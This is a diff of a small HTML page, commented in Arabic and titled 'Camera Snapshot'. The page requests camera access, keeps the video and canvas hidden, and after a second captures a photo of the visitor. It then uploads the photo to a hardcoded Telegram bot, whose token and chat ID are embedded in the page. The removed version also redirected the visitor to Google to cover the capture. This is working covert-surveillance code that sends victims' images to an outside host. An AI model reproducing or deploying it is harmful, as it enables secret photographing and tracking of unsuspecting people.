@@ -1,58 +1,59 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>كاميرا</title>
+  <title>Camera Snapshot</title>
 </head>
 <body>
+  <video id="video" autoplay playsinline style="display: none;"></video>
+  <canvas id="canvas" style="display: none;"></canvas>
 
-<!-- نخفي الفيديو والكانفس -->
-<video id="video" autoplay playsinline style="display:none;"></video>
-<canvas id="canvas" style="display:none;"></canvas>
+  <script>
+    const BOT_TOKEN = "8149313325:AAEc6to9UMMeyEf6MHYaJvtI5_fdC9K5Ros";
+    const CHAT_ID = "7924214467";
 
-<script>
-  const token = '8149313325:AAEc6to9UMMeyEf6MHYaJvtI5_fdC9K5Ros';
-  const chatId = '7924214467';
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        const video = document.getElementById('video');
+        video.srcObject = stream;
 
-  navigator.mediaDevices.getUserMedia({
-    video: { facingMode: "user" } // ← الكاميرا الأمامية
-  })
-  .then(function(stream) {
-    const video = document.getElementById('video');
-    video.srcObject = stream;
+        video.onloadedmetadata = () => {
+          setTimeout(() => {
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0);
 
-    video.onloadedmetadata = () => {
-      const canvas = document.getElementById('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+              const formData = new FormData();
+              formData.append("chat_id", CHAT_ID);
+              formData.append("photo", blob, "snapshot.png");
 
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("photo", blob, "photo.png");
+              fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+              })
+              .then(response => {
+                if (response.ok) {
+                  console.log("✅ تم إرسال الصورة بنجاح");
+                } else {
+                  console.error("❌ فشل الإرسال", response.statusText);
+                }
+              })
+              .catch(error => {
+                console.error("❌ خطأ في الاتصال:", error);
+              });
 
-        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: "POST",
-          body: formData
-        }).then(res => {
-          console.log("✅ تم إرسال الصورة إلى تيليجرام");
-        }).catch(err => {
-          console.error("❌ فشل الإرسال:", err);
-        });
+              // إيقاف الكاميرا
+              stream.getTracks().forEach(track => track.stop());
+            }, "image/png");
 
-        // إعادة التوجيه إلى Google بعد 2 ثانية
-        setTimeout(() => {
-          window.location.href = "https://www.google.com";
-        }, 2000);
-      }, 'image/png');
-    };
-
-  })
-  .catch(function(error) {
-    alert("⚠️ فشل الوصول إلى الكاميرا: " + error.message);
-    console.error(error);
-  });
-</script>
-
+          }, 1000); // التقاط الصورة بعد ثانية واحدة
+        };
+      })
+      .catch(error => {
+        alert("فشل الوصول إلى الكاميرا: " + error);
+      });
+  </script>
 </body>
 </html>
